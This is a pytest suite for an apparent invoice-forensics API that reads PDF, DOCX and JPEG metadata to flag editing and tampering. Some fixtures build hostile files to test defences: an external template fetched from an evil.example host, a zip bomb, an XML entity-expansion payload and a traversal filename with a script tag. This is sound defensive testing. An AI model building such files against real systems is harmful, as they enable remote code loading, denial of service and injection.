import io
import zipfile
from datetime import datetime, timezone

from fastapi.testclient import TestClient
from PIL import Image
from pypdf import PdfWriter

from app.analyzers.document import MAX_BYTES, analyze_document, detect_format, extract_metadata
from app.main import app
from app.models import Direction

client = TestClient(app)
NOW = datetime(2026, 9, 24, 12, 0, tzinfo=timezone.utc)


# ------------------------------------------------------------------ fixture builders

def make_pdf(meta: dict | None = None, js: str | None = None) -> bytes:
    w = PdfWriter()
    w.add_blank_page(width=200, height=200)
    if meta:
        w.add_metadata(meta)
    if js:
        w.add_js(js)
    buf = io.BytesIO()
    w.write(buf)
    return buf.getvalue()


def make_docx(core: str = "", app_xml: str = "", extra: dict[str, bytes] | None = None, body: str = "<w:document/>") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", body)
        if core:
            z.writestr("docProps/core.xml", core)
        if app_xml:
            z.writestr("docProps/app.xml", app_xml)
        for name, content in (extra or {}).items():
            z.writestr(name, content)
    return buf.getvalue()


CORE = ('<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
        'xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/">'
        '<dc:creator>{creator}</dc:creator><cp:lastModifiedBy>{last}</cp:lastModifiedBy>'
        '<dcterms:created>{created}</dcterms:created><dcterms:modified>{modified}</dcterms:modified></cp:coreProperties>')
APP = ('<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">'
       '<Application>{app}</Application><Company>{company}</Company></Properties>')


def make_jpeg(software: str | None = None) -> bytes:
    img = Image.new("RGB", (40, 30), "white")
    exif = Image.Exif()
    if software:
        exif[305] = software
        exif[306] = "2026:09:23 10:00:00"
    buf = io.BytesIO()
    img.save(buf, "JPEG", exif=exif)
    return buf.getvalue()


def ids(report, direction=None):
    return {s.id.removeprefix("document.") for s in report.signals if direction is None or s.direction == direction}


SUS, REASSURING = Direction.suspicious, Direction.reassuring


# ------------------------------------------------------------------ PDFs

def test_pdf_made_in_photoshop_and_edited_after_creation_is_flagged():
    data = make_pdf({"/Producer": "Adobe Photoshop 25.0", "/Creator": "Adobe Photoshop",
                     "/CreationDate": "D:20260923100000Z", "/ModDate": "D:20260924100000Z"})
    r = analyze_document(data, "invoice.pdf", now=NOW)
    assert r.format == "pdf"
    assert {"editing_tool", "modified_after_creation", "recently_created"} <= ids(r, SUS)
    assert "Adobe Photoshop" in r.fields["Made with (producer)"]
    assert r.fields["Created"] == "2026-09-23 10:00 UTC"


def test_pdf_from_accounting_software_is_reassuring_and_not_flagged():
    data = make_pdf({"/Producer": "Tally Prime 4.1", "/CreationDate": "D:20260601090000Z", "/ModDate": "D:20260601090000Z"})
    r = analyze_document(data, "inv.pdf", now=NOW)
    assert "accounting_software" in ids(r, REASSURING)
    assert ids(r, SUS) == set()


def test_pdf_saved_more_than_once_is_flagged(tmp_path):
    """A genuine incremental update: the second revision is appended after the first %%EOF."""
    first = make_pdf({"/Producer": "Microsoft Word", "/CreationDate": "D:20260601090000Z"})
    path = tmp_path / "invoice.pdf"
    path.write_bytes(first)
    w = PdfWriter(str(path), incremental=True)  # incremental mode needs a real file path
    w.add_metadata({"/ModDate": "D:20260923090000Z"})
    w.write(str(path))
    data = path.read_bytes()
    assert data.count(b"%%EOF") == 2
    r = analyze_document(data, "x.pdf", now=NOW)
    assert "incremental_updates" in ids(r, SUS)
    assert r.fields["Saved versions"] == "2"
    assert "incremental_updates" not in ids(analyze_document(first, "x.pdf", now=NOW))


def test_pdf_with_javascript_is_flagged_as_active_content():
    r = analyze_document(make_pdf({"/Producer": "Microsoft Word"}, js="app.alert('hi');"), "x.pdf", now=NOW)
    assert "active_content" in ids(r, SUS)


def test_file_without_metadata_is_unknown_not_suspicious():
    r = analyze_document(make_docx(), "x.docx", now=NOW)
    assert {"no_metadata", "no_dates"} <= ids(r, Direction.unknown)
    assert ids(r, SUS) == set()


def test_online_converter_is_a_weak_flag():
    r = analyze_document(make_pdf({"/Producer": "iLovePDF"}), "x.pdf", now=NOW)
    assert "online_converter" in ids(r, SUS)
    assert next(s for s in r.signals if s.id == "document.online_converter").strength <= 0.3


def test_impossible_and_future_dates():
    r = analyze_document(make_pdf({"/Producer": "Microsoft Word", "/CreationDate": "D:20260601000000Z",
                                   "/ModDate": "D:20250101000000Z"}), "x.pdf", now=NOW)
    assert "dates_inconsistent" in ids(r, SUS)
    r = analyze_document(make_pdf({"/Producer": "Microsoft Word", "/CreationDate": "D:20270101000000Z"}), "x.pdf", now=NOW)
    assert "future_date" in ids(r, SUS)


def test_vendor_mismatch_is_weak_and_matching_vendor_passes():
    data = make_pdf({"/Producer": "Tally Prime", "/Author": "R K Enterprises", "/CreationDate": "D:20260601090000Z"})
    r = analyze_document(data, "x.pdf", vendor="Sunrise Traders Pvt Ltd", now=NOW)
    assert "author_vendor_mismatch" in ids(r, SUS)
    r = analyze_document(data, "x.pdf", vendor="R K Enterprises Pvt Ltd", now=NOW)
    assert "author_vendor_mismatch" not in ids(r)


# ------------------------------------------------------------------ Office files

def test_docx_metadata_is_read_and_editing_signals_apply():
    core = CORE.format(creator="Priya", last="Someone Else", created="2026-05-01T09:00:00Z", modified="2026-09-23T09:00:00Z")
    data = make_docx(core, APP.format(app="Microsoft Office Word", company="Sunrise Traders"))
    m = extract_metadata(data)
    assert m.format == "docx" and m.author == "Priya" and m.company == "Sunrise Traders"
    assert m.fields["Last saved by"] == "Someone Else"
    r = analyze_document(data, "letter.docx", vendor="Sunrise Traders", now=NOW)
    assert "modified_after_creation" in ids(r, SUS)
    assert "author_vendor_mismatch" not in ids(r)


def test_macros_external_template_and_tracked_changes_are_flagged():
    rels = b'<Relationships><Relationship Type="x/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>'
    data = make_docx(CORE.format(creator="a", last="a", created="2026-01-01T00:00:00Z", modified="2026-01-01T00:00:00Z"),
                     extra={"word/vbaProject.bin": b"\x00", "word/_rels/document.xml.rels": rels},
                     body='<w:document><w:ins w:id="1"/></w:document>')
    r = analyze_document(data, "x.docx", now=NOW)
    assert {"macros", "external_template", "tracked_changes"} <= ids(r, SUS)


def test_zip_bomb_is_refused_safely():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("docProps/core.xml", "<a/>")
        z.writestr("word/big.bin", b"\0" * (70 * 1024 * 1024))
    data = buf.getvalue()
    assert len(data) < MAX_BYTES  # small on the wire, huge when expanded
    r = analyze_document(data, "bomb.docx", now=NOW)
    assert "unreadable" in ids(r, Direction.unknown)


def test_malicious_xml_entities_do_not_expand():
    evil = ('<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">]>'
            '<cp:coreProperties xmlns:cp="x" xmlns:dc="y"><dc:creator>&b;</dc:creator></cp:coreProperties>')
    r = analyze_document(make_docx(evil), "x.docx", now=NOW)
    assert "unreadable" in ids(r, Direction.unknown)  # defusedxml refuses entity definitions


# ------------------------------------------------------------------ images

def test_image_edited_in_photoshop_is_flagged():
    r = analyze_document(make_jpeg("Adobe Photoshop 25.0"), "scan.jpg", now=NOW)
    assert r.format == "image" and "editing_tool" in ids(r, SUS)
    assert r.fields["Software"].startswith("Adobe Photoshop")


def test_image_without_metadata_is_unknown():
    r = analyze_document(make_jpeg(None), "photo.jpg", now=NOW)
    assert "no_metadata" in ids(r, Direction.unknown)


# ------------------------------------------------------------------ robustness and endpoint

def test_garbage_and_unknown_formats_are_unreadable_not_crashes():
    for blob in (b"hello world", b"\x00" * 50, b"%PDF-1.4 truncated nonsense", b"PK\x03\x04broken"):
        r = analyze_document(blob, "x", now=NOW)
        assert "unreadable" in ids(r, Direction.unknown), blob[:12]
    assert detect_format(b"%PDF-1.7") == "pdf"


def test_format_is_detected_by_content_not_by_file_name():
    r = analyze_document(make_pdf({"/Producer": "Microsoft Word"}), "totally_a_picture.png", now=NOW)
    assert r.format == "pdf"


def test_filename_is_sanitised():
    r = analyze_document(make_pdf(), "..\\..\\evil\x00name<script>.pdf", now=NOW)
    assert "\\" not in r.filename and "\x00" not in r.filename and "/" not in r.filename


def test_endpoint_upload_and_limits():
    pdf = make_pdf({"/Producer": "Adobe Photoshop 25.0", "/CreationDate": "D:20200101000000Z"})
    r = client.post("/analyze-document", files={"file": ("invoice.pdf", pdf, "application/pdf")}, data={"vendor": "Acme"})
    assert r.status_code == 200
    body = r.json()
    assert body["format"] == "pdf" and any(s["id"] == "document.editing_tool" for s in body["signals"])
    assert client.post("/analyze-document", files={"file": ("e.pdf", b"", "application/pdf")}).status_code == 422
    big = b"%PDF-" + b"0" * (MAX_BYTES + 10)
    assert client.post("/analyze-document", files={"file": ("big.pdf", big, "application/pdf")}).status_code == 413
